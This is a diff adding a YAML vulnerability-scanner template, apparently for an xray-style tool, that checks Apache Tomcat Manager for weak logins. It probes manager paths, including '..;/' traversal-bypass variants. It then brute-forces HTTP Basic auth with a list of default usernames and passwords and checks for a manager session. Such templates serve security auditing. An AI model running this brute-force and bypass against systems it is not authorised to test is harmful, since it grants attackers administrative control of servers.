@@ -1,0 +1,79 @@
+id: tomcat-weak-login
+
+info:
+  name: Apahce Tomcat Manager Weak Login
+  author: pdteam
+  severity: high
+  verified: true
+  tags: tomcat,default-login
+  created: 2023/06/24
+  requires: [tomcat-manager]
+
+set:
+  randstr: randomLowercase(6)
+rules:
+  r0:
+    brute:
+      mode: sniper
+      commit: winner
+      continue: false
+      p:
+        - /manager/html
+        - /host-manager/html
+        - "/..;/manager/html"
+        - "/..;/host-manager/html"
+        - "/..;/..;/manager/html;/"
+        - "/..;/..;/host-manager/html;/"
+        - "/{{randstr}}/..;/manager/html"
+        - "/{{randstr}}/..;/host-manager/html"
+    request:
+      method: GET
+      path: "{{p}}"
+    expression: response.status == 403 && response.body.bcontains(b'username="tomcat" password="s3cret"') && response.body.bcontains(b'manager-gui')
+    stop_if_mismatch: true
+  r1:
+    brute:
+      mode: clusterbomb
+      commit: winner
+      continue: false
+      username:
+        - admin
+        - tomcat
+        - manager
+        - role1
+        - both
+      password:
+        - admin
+        - tomcat
+        - manager
+        - role1
+        - both
+        - s3cret
+        - password
+        - 123456
+        - 12345678
+        - 12345
+        - 1234
+        - 000000
+        - admin123
+        - admin@123
+        - admin123456
+        - tomcat123
+        - tomcat@123
+        - manager123
+        - changeme
+    request:
+      method: GET
+      path: "{{p}}"
+      headers:
+        Authorization: "Basic {{base64(username + ':' + password)}}"
+    expression: |
+      response.status == 200 &&
+      response.headers["set-cookie"].contains("JSESSIONID") &&
+      (
+        response.body.bcontains(b"Tomcat Manager Application") ||
+        response.body.bcontains(b"<title>/manager</title>") ||
+        response.body.bcontains(b"<title>/host-manager</title>") ||
+        response.body.bcontains(b"manager-gui")
+      )
+expression: r0() && r1()
